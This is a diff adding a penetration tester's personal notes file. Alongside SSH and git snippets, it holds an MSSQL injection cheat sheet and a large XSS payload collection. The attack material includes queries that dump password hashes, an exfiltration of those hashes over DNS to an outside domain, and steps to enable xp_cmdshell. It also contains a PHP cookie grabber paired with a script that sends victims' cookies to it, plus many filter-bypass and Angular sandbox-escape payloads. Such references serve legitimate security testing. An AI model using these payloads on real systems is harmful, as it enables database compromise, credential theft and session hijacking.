@@ -1,0 +1,3374 @@
+{TEMPORARY}
+
+-------------------------------------------------------------------------------
+{ssh}
+-------------------------------------------------------------------------------
+bl4de:~/hacking/tools $ ssh-add -l
+
+The agent has no identities.
+
+bl4de:~/hacking/tools $ cd ~/.ssh/
+bl4de:~/.ssh $ ll
+
+total 32
+-rw-------  1 bl4de  staff  1766 Sep  5  2015 id_rsa
+-rw-r--r--  1 bl4de  staff   408 Sep  5  2015 id_rsa.pub
+-rw-r--r--  1 bl4de  staff  6712 Jan 15 01:07 known_hosts
+
+bl4de:~/.ssh $ ssh-add -K id_rsa
+
+Identity added: id_rsa (id_rsa)
+
+bl4de:~/.ssh $ ssh-add -l
+2048 SHA256:Gl3ySxCVYaD8RcYhAHhj/t/lWBHnXOEPSAkjKfd8Pp0 id_rsa (RSA)
+
+-------------------------------------------------------------------------------
+{git}{Brave}
+-------------------------------------------------------------------------------
+
+git fetch upstream
+git checkout master
+git merge upstream/master
+
+
+
+
+###############################################################################
+{MSSQL}
+###############################################################################
+
+SELECT @@VERSION
+
+Then there is a set of four numbers in the format of A.B.C.D. In this case, it's 10.0.5500.0. The first two numbers (10.0) tell us the numeric version of SQL Server. Going back to SQL Server 2000, we have the following versions, as of the writing of this tip:
+
+SQL Server #	
+SQL Server Version
+
+8.00	SQL Server 2000 
+9.00	SQL Server 2005 
+10.0	SQL Server 2008 
+10.5	SQL Server 2008 R2
+The last half of that set of four numbers corresponds to the build of SQL Server at that version and service pack. The best resource to match up what has been installed on your SQL Server compared to the version you're receiving back is the SQL Server Version Database at SQLSecurity.com. 5500.0 is SQL Server 2008 SP3 with no cumulative updates or hotfixes according to the database.
+
+
+Version	SELECT @@version
+Comments	SELECT 1 — comment
+SELECT /*comment*/1
+Current User	SELECT user_name();
+SELECT system_user;
+SELECT user;
+SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID
+List Users	SELECT name FROM master..syslogins
+List Password Hashes	SELECT name, password FROM master..sysxlogins — priv, mssql 2000;
+SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins — priv, mssql 2000.  Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.
+SELECT name, password_hash FROM master.sys.sql_logins — priv, mssql 2005;
+SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins — priv, mssql 2005
+ Password Cracker	MSSQL 2000 and 2005 Hashes are both SHA1-based.  phrasen|drescher can crack these.
+List Privileges	– current privs on a particular object in 2005, 2008
+SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’); — current database
+SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’); — current server
+SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’); –permissions on a table
+SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);
+–permissions on a user– current privs in 2005, 2008
+SELECT is_srvrolemember(‘sysadmin’);
+SELECT is_srvrolemember(‘dbcreator’);
+SELECT is_srvrolemember(‘bulkadmin’);
+SELECT is_srvrolemember(‘diskadmin’);
+SELECT is_srvrolemember(‘processadmin’);
+SELECT is_srvrolemember(‘serveradmin’);
+SELECT is_srvrolemember(‘setupadmin’);
+SELECT is_srvrolemember(‘securityadmin’);
+– who has a particular priv? 2005, 2008
+SELECT name FROM master..syslogins WHERE denylogin = 0;
+SELECT name FROM master..syslogins WHERE hasaccess = 1;
+SELECT name FROM master..syslogins WHERE isntname = 0;
+SELECT name FROM master..syslogins WHERE isntgroup = 0;
+SELECT name FROM master..syslogins WHERE sysadmin = 1;
+SELECT name FROM master..syslogins WHERE securityadmin = 1;
+SELECT name FROM master..syslogins WHERE serveradmin = 1;
+SELECT name FROM master..syslogins WHERE setupadmin = 1;
+SELECT name FROM master..syslogins WHERE processadmin = 1;
+SELECT name FROM master..syslogins WHERE diskadmin = 1;
+SELECT name FROM master..syslogins WHERE dbcreator = 1;
+SELECT name FROM master..syslogins WHERE bulkadmin = 1;
+List DBA Accounts	SELECT is_srvrolemember(‘sysadmin’); — is your account a sysadmin?  returns 1 for true, 0 for false, NULL for invalid role.  Also try ‘bulkadmin’, ‘systemadmin’ and other values from the documentation
+SELECT is_srvrolemember(‘sysadmin’, ‘sa’); — is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.
+SELECT name FROM master..syslogins WHERE sysadmin = ’1′ — tested on 2005
+Current Database	SELECT DB_NAME()
+List Databases	SELECT name FROM master..sysdatabases;
+SELECT DB_NAME(N); — for N = 0, 1, 2, …
+List Columns	SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
+List Tables	SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
+SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
+Find Tables From Column Name	– NB: This example works only for the current database.  If you wan’t to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).
+SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = ‘U’ AND syscolumns.name LIKE ‘%PASSWORD%’ — this lists table, column for each column containing the word ‘password’
+Select Nth Row	SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC — gets 9th row
+Select Nth Char	SELECT substring(‘abcd’, 3, 1) — returns c
+Bitwise AND	SELECT 6 & 2 — returns 2
+SELECT 6 & 1 — returns 0
+ASCII Value -> Char	SELECT char(0×41) — returns A
+Char -> ASCII Value	SELECT ascii(‘A’) – returns 65
+Casting	SELECT CAST(’1′ as int);
+SELECT CAST(1 as char)
+String Concatenation	SELECT ‘A’ + ‘B’ – returns AB
+If Statement	IF (1=1) SELECT 1 ELSE SELECT 2 — returns 1
+Case Statement	SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END — returns 1
+Avoiding Quotes	SELECT char(65)+char(66) — returns AB
+Time Delay	 WAITFOR DELAY ’0:0:5′ — pause for 5 seconds
+Make DNS Requests	declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + ‘c$boot.ini”’); — nonpriv, works on 2000declare @host varchar(800); select @host = name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + ‘c$boot.ini”’); — priv, works on 2005– NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.
+– Also check out theDNS tunnel feature of sqlninja
+Command Execution	EXEC xp_cmdshell ‘net user’; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
+EXEC sp_configure ‘show advanced options’, 1; — priv
+RECONFIGURE; — priv
+EXEC sp_configure ‘xp_cmdshell’, 1; — priv
+RECONFIGURE; — priv
+Local File Access	CREATE TABLE mydata (line varchar(8000));
+BULK INSERT mydata FROM ‘c:boot.ini’;
+DROP TABLE mydata;
+Hostname, IP Address	SELECT HOST_NAME()
+Create Users	EXEC sp_addlogin ‘user’, ‘pass’; — priv
+Drop Users	EXEC sp_droplogin ‘user’; — priv
+Make User DBA	EXEC master.dbo.sp_addsrvrolemember ‘user’, ‘sysadmin; — priv
+Location of DB files	EXEC sp_helpdb master; –location of master.mdf
+EXEC sp_helpdb pubs; –location of pubs.mdf
+Default/System Databases	northwind
+model
+msdb
+pubs — not on sql server 2005
+tempdb
+
+###############################################################################
+{data uri}{RFC2397}
+###############################################################################
+
+Data URIs are composed of four parts: a prefix (data:), a MIME type indicating the type of data, an optional base64 token if non-textual, and the data itself:
+
+data:[<mediatype>][;base64],<data>
+
+The mediatype is a MIME type string, such as 'image/jpeg' for a JPEG image file. If omitted, defaults to text/plain;charset=US-ASCII
+
+
+
+data:,Hello%2C%20World!
+Simple text/plain data
+
+data:text/plain;base64,SGVsbG8sIFdvcmxkIQ%3D%3D
+base64-encoded version of the above
+
+data:text/html,%3Ch1%3EHello%2C%20World!%3C%2Fh1%3E
+An HTML document with <h1>Hello, World!</h1>
+
+data:text/html,<script>alert('hi');</script>
+An HTML document that executes a JavaScript alert. Note that the closing script tag is required.
+
+###############################################################################
+{wfuzz}
+###############################################################################
+https://github.com/xmendez/wfuzz/wiki/
+
+wfuzz.py -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ
+
+Example filtering by the status code 404, which indicates that the server has not found anything matching the URI given
+
+wfuzz.py -w wordlist/general/common.txt --hc 404 http://testphp.vulnweb.com/FUZZ 
+
+
+###############################################################################
+{routing}
+###############################################################################
+
+$ ip route    (Linux)
+$ route
+
+dodanie trasy:
+$ ip route add 192.168.10.0/24 via 10.20.30.10 dev eth0   (pierwsze IP - sieć, drugie - gateway)
+
+usuniecie trasy:
+$ ip route del 192.168.10.0/24 dev eth0
+
+C\> route print (Windows)
+$ netstat -r  (OSX)
+
+###############################################################################
+{XSS}{encoding}
+###############################################################################
+
+Possible encodings of <
+
+<
+%3C
+&lt
+&lt;
+&LT
+&LT;
+&#60
+&#060
+&#0060
+&#00060
+&#000060
+&#0000060
+&#60;
+&#060;
+&#0060;
+&#00060;
+&#000060;
+&#0000060;
+&#x3c
+&#x03c
+&#x003c
+&#x0003c
+&#x00003c
+&#x000003c
+&#x3c;
+&#x03c;
+&#x003c;
+&#x0003c;
+&#x00003c;
+&#x000003c;
+&#X3c
+&#X03c
+&#X003c
+&#X0003c
+&#X00003c
+&#X000003c
+&#X3c;
+&#X03c;
+&#X003c;
+&#X0003c;
+&#X00003c;
+&#X000003c;
+&#x3C
+&#x03C
+&#x003C
+&#x0003C
+&#x00003C
+&#x000003C
+&#x3C;
+&#x03C;
+&#x003C;
+&#x0003C;
+&#x00003C;
+&#x000003C;
+&#X3C
+&#X03C
+&#X003C
+&#X0003C
+&#X00003C
+&#X000003C
+&#X3C;
+&#X03C;
+&#X003C;
+&#X0003C;
+&#X00003C;
+&#X000003C;
+\x3c
+\x3C
+\u003c
+\u003C
+
+
+###############################################################################
+{XSS}{polyglot}{payload}
+###############################################################################
+
+
+- customizable Themes & Profiles via CSS
+- event or meeting names
+- URI based
+- imported from a 3rd party (think Facebook integration)
+- JSON POST Values (check returning content type)
+- File Upload names
+- uploaded files (swf, HTML, ++)
+- Custom Error pages
+- fake params - ?realparam=1&foo=bar’+alert(/XSS/)+’
+- Login and Forgot password forms
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+
+'">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+ 
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+
+###############################################################################
+{XSS}{payloads}
+###############################################################################
+
+http://d3adend.org/xss/ghettoBypass
+http://zseano.com/tut/4.html
+                                    
+
+Cookie grabber for XSS
+
+<?php 
+// How to use it
+# <script>document.location='http://localhost/XSS/grabber.php?c=' + document.cookie</script>
+
+// Write the cookie in a file
+$cookie = $_GET['c'];
+$fp = fopen('cookies.txt', 'a+');
+fwrite($fp, 'Cookie:' .$cookie.'\r\n');
+fclose($fp);
+
+?>
+XSS in HTML/Applications
+
+XSS Basic
+
+Basic payload
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+
+Img payload
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+
+Svg payload
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+XSS for HTML5
+
+<body onload=alert(/XSS/.source)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video src=_ onloadstart="alert(1)">
+<details/open/ontoggle="alert`1`">
+<audio src onloadstart=alert(1)>
+<marquee onstart=alert(1)>
+XSS in META tag
+
+Base64 encoded
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+
+<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
+
+With an additional URL
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+XSS in flash application
+
+ \%22})))}catch(e){alert(document.domain);}// 
+
+ "]);}catch(e){}if(!self.a)self.a=!alert(document.domain);// 
+
+ "a")(({type:"ready"}));}catch(e){alert(1)}// 
+XSS in Hidden input
+
+<input type="hidden" accesskey="X" onclick="alert(1)">
+Use CTRL+SHIFT+X to trigger the onclick event
+DOM XSS
+
+#"><img src=/ onerror=alert(2)>
+XSS in wrappers javascript and data URI
+
+XSS with javascript:
+
+javascript:prompt(1)
+
+%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341
+
+&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41
+
+We can encode the "javacript:" in Hex/Octal
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+
+We can use a 'newline character'
+java%0ascript:alert(1)   - LF (\n)
+java%09script:alert(1)   - Horizontal tab (\t)
+java%0dscript:alert(1)   - CR (\r)
+
+Using the escape character
+ \j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+
+Using the newline and a comment //
+javascript://%0Aalert(1)
+javascript://anything%0D%0A%0D%0Awindow.alert(1)
+XSS with data:
+
+data:text/html,<script>alert(0)</script>
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+XSS with vbscript: only IE
+
+vbscript:msgbox("XSS")
+XSS in files
+
+XSS in XML
+
+<html>
+<head></head>
+<body>
+<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
+</body>
+</html>
+XSS in SVG
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert(document.domain);
+   </script>
+</svg>
+XSS in SVG (short)
+
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+XSS in SWF
+
+Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
+IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
+IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
+
+
+InsecureFlashFile.swf
+location to url: InsecureFlashFile.swf?a=location&c=http://www.google.com/
+open url to new window: InsecureFlashFile.swf?a=open&c=http://www.google.com/
+http request to url: InsecureFlashFile.swf?a=get&c=http://www.google.com/
+eval js codz: InsecureFlashFile.swf?a=eval&c=alert(document.domain)
+more payloads in ./files
+
+XSS with Relative Path Overwrite - IE 8/9 and lower
+
+You need these 3 components
+
+1) stored XSS that allows CSS injection. : {}*{xss:expression(open(alert(1)))}
+2) URL Rewriting.
+3) Relative addressing to CSS style sheet : ../style.css
+
+A little example
+
+http://url.example.com/index.php/[RELATIVE_URL_INSERTED_HERE]
+<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<link href="[RELATIVE_URL_INSERTED_HERE]/styles.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+Stored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))}
+</body>
+</html>
+Explanation of the vulnerability
+
+The Meta element forces IE’s document mode into IE7 compat which is required to execute expressions. Our persistent text {}*{xss:expression(open(alert(1)))is included on the page and in a realistic scenario it would be a profile page or maybe a shared status update which is viewable by other users. We use “open” to prevent client side DoS with repeated executions of alert. 
+
+A simple request of “rpo.php/” makes the relative style load the page itself as a style sheet. The actual request is “/labs/xss_horror_show/chapter7/rpo.php/styles.css” the browser thinks there’s another directory but the actual request is being sent to the document and that in essence is how an RPO attack works.
+
+Demo 1 at http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo.php
+Demo 2 at http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo2.php/fakedirectory/fakedirectory2/fakedirectory3
+MultiBrowser : http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo3.php
+
+
+From : http://www.thespanner.co.uk/2014/03/21/rpo/
+Mutated XSS for Browser IE8/IE9
+
+<listing id=x>&lt;img src=1 onerror=alert(1)&gt;</listing>
+<script>alert(document.getElementById('x').innerHTML)</script>
+IE will read and write (decode) HTML multiple time and attackers XSS payload will mutate and execute.
+
+XSS in Angular
+
+Angular 1.6.0
+
+{{0[a='constructor'][a]('alert(1)')()}}
+Angular 1.5.9
+
+{{
+    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
+    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
+    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
+    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
+    B=C(b,c,b);$evalAsync("
+    astNode=pop();astNode.type='UnaryExpression';
+    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
+    astNode.argument={type:'Identifier',name:'foo'};
+    ");
+    m1=B($$asyncQueue.pop().expression,null,$root);
+    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
+    $eval('a(b.c)');[].push.apply=a;
+}}
+Angular 1.5.0 - 1.5.8
+
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+Angular 1.4.0 - 1.4.9
+
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+Angular 1.3.20
+
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+Angular 1.3.19
+
+{{
+    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
+    $eval('x=alert(1)//'); 
+}}
+Angular 1.3.3 - 1.3.18
+
+{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
+  'a'.constructor.prototype.charAt=[].join;
+  $eval('x=alert(1)//');  }}
+Angular 1.3.1 - 1.3.2
+
+{{
+    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
+    'a'.constructor.prototype.charAt=''.valueOf; 
+    $eval('x=alert(1)//'); 
+}}
+Angular 1.3.0
+
+{{!ready && (ready = true) && (
+      !call
+      ? $$watchers[0].get(toString.constructor.prototype)
+      : (a = apply) &&
+        (apply = constructor) &&
+        (valueOf = call) &&
+        (''+''.toString(
+          'F = Function.prototype;' +
+          'F.apply = F.a;' +
+          'delete F.a;' +
+          'delete F.valueOf;' +
+          'alert(1);'
+        ))
+    );}}
+Angular 1.2.24 - 1.2.29
+
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+Angular 1.2.19 - 1.2.23
+
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
+Angular 1.2.6 - 1.2.18
+
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+Angular 1.2.2 - 1.2.5
+
+{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
+Angular 1.2.0 - 1.2.1
+
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+Angular 1.0.1 - 1.1.5
+
+{{constructor.constructor('alert(1)')()}}
+Polyglot XSS
+
+Polyglot XSS - 0xsobky
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+Polyglot XSS - Ashar Javed
+
+ ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+Polyglot XSS - Mathias Karlsson
+
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)// 
+Polyglot XSS - Rsnake
+
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT> 
+Filter Bypass and exotic payloads
+
+Bypass case sensitive
+
+<sCrIpt>alert(1)</ScRipt>
+Bypass quotes for string
+
+String.fromCharCode(88,83,83)
+Bypass quotes in script tag
+
+http://localhost/bla.php?test=</script><script>alert(1)</script>
+<html>
+  <script>
+    <?php echo 'foo="text '.$_GET['test'].'";';`?>
+  </script>
+</html>
+Bypass quotes in mousedown event
+
+<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
+
+You can bypass a single quote with &#39; in an on mousedown event handler
+Bypass dot filter
+
+<script>window['alert'](document['domain'])<script>
+Bypass parenthesis for string - Firefox
+
+alert`1`
+Bypass onxxxx= blacklist
+
+<object onafterscriptexecute=confirm(0)>
+<object onbeforescriptexecute=confirm(0)>
+Bypass onxxx= filter with a null byte/vertical tab - IE/Safari
+
+<img src='1' onerror\x00=alert(0) />
+<img src='1' onerror\x0b=alert(0) />
+Bypass onxxx= filter with a '/' - IE/Firefox/Chrome/Safari
+
+<img src='1' onerror/=alert(0) />
+Bypass space filter with "/" - IE/Firefox/Chrome/Safari
+
+<img/src='1'/onerror=alert(0)>
+Bypass with incomplete html tag - IE/Firefox/Chrome/Safari
+
+<img src='1' onerror='alert(0)' <
+Bypass using javascript inside a string
+
+<script>
+foo="text </script><script>alert(1)</script>";
+</script>
+Bypass using an alternate way to execute an alert
+
+<script>window['alert'](0)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](2)</script>
+<script>top['alert'](3)</script>
+Bypass using an alternate way to trigger an alert
+
+var i = document.createElement("iframe");
+i.onload = function(){
+  i.contentWindow.alert(1);
+}
+document.appendChild(i);
+
+// Bypassed security
+XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
+      var proxy = obj[name];
+      obj[name] = function () {
+         if (exec_original) {
+            return proxy.apply(this, arguments);
+         }
+      };
+      XSSObject.lockdown(obj, name);
+   };
+XSSObject.proxy(window, 'alert', 'window.alert', false);
+Bypass ';' using another character
+
+'te' * alert('*') * 'xt';
+'te' / alert('/') / 'xt';
+'te' % alert('%') % 'xt';
+'te' - alert('-') - 'xt';
+'te' + alert('+') + 'xt';
+'te' ^ alert('^') ^ 'xt';
+'te' > alert('>') > 'xt';
+'te' < alert('<') < 'xt';
+'te' == alert('==') == 'xt';
+'te' & alert('&') & 'xt';
+'te' , alert(',') , 'xt';
+'te' | alert('|') | 'xt';
+'te' ? alert('ifelsesh') : 'xt';
+'te' in alert('in') in 'xt';
+'te' instanceof alert('instanceof') instanceof 'xt';
+Bypass using Unicode
+
+Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
+transformed into U+003C LESS­THAN SIGN (<)
+
+Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
+transformed into U+0022 QUOTATION MARK (")
+
+Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
+transformed into U+0027 APOSTROPHE (')
+
+Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
+transformed into U+003C LESS­THAN SIGN (<)
+
+Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
+transformed into U+0022 QUOTATION MARK (")
+
+Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
+transformed into U+0027 APOSTROPHE (')
+
+E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
+%EF%BC%9E becomes >
+%EF%BC%9C becomes <
+Bypass using unicode converted to uppercase
+
+İ (%c4%b0).toLowerCase() => i
+ı (%c4%b1).toUpperCase() => I
+ſ (%c5%bf) .toUpperCase() => S
+K (%E2%84%AA).toLowerCase() => k
+
+<ſvg onload=... > become <SVG ONLOAD=...> 
+<ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
+Bypass using overlong UTF-8
+
+< = %C0%BC = %E0%80%BC = %F0%80%80%BC
+> = %C0%BE = %E0%80%BE = %F0%80%80%BE
+' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
+" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
+" = %CA%BA
+' = %CA%B9
+Bypass using UTF-7
+
++ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
+Bypass using weird encoding or native interpretation to hide the payload (alert())
+
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
+<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
+<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
